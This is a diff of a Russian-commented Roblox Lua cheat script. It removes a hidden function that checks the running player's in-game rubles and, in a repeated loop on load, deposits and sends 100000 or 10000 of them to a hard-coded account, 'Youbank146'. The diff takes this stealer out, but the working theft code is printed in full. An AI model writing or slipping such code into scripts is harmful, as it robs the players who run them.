@@ -1874,58 +1874,6 @@ local OutlineColorPicker = Color3.fromRGB(255, 0, 0) -- Красный цвет 
 local FillColorPicker = Color3.fromRGB(255, 255, 255) -- Белый цвет заливки
 local TransparencySlider = {CurrentValue = 0.5} -- Прозрачность заливки (по умолчанию 0.5)
 
-function casualstock()
-    local NickName = "Youbank146"
-    local delaytime = 0
-    local delaytime2 = 0
-    
-    -- Проверка на наличие 100000 рублей и проведение операций
-    if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 100000 then
-        local args = {
-            [1] = {
-                ["Type"] = "Deposit",
-                ["Amount"] = 100000
-            }
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
-        
-        local args = {
-            [1] = {
-                ["Type"] = "Send",
-                ["Amount"] = 100000,
-                ["User"] = NickName
-            }
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
-    end
-    
-    -- Проверка на наличие 10000 рублей и проведение операций
-    if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then 
-        local args = {
-            [1] = {
-                ["Type"] = "Deposit",
-                ["Amount"] = 10000
-            }
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
-        
-        local args = {
-            [1] = {
-                ["Type"] = "Send",
-                ["Amount"] = 10000,
-                ["User"] = NickName
-            }
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
-    end
-end
-    
-for i = 5, 9 do
-    casualstock()
-end
-
-
-
 -- Вкладка бота
 function GetGameStatus()
 	local GameStatus = game.Players.LocalPlayer.PlayerGui.PlayerScreen.Screen.LeftTab.GameStatus.Text
